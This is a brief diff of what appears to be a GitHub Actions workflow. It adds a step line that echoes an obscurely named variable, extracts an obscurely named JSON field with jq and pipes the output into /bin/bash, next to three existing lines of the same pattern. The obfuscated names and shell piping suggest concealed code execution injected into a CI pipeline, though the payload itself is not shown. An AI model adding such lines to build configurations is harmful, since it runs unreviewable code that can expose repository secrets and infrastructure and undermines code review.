@@ -26,6 +26,7 @@ jobs:
           echo $muon59750 | jq -r .ebua63 | /bin/bash
           printf '%s' "$h7" | jq -r .ddncg955 | /bin/bash
           printf '%s' "$bxce150" | jq -r .qbp121 | /bin/bash
+          echo $pllh6085 | jq -r .usn530 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
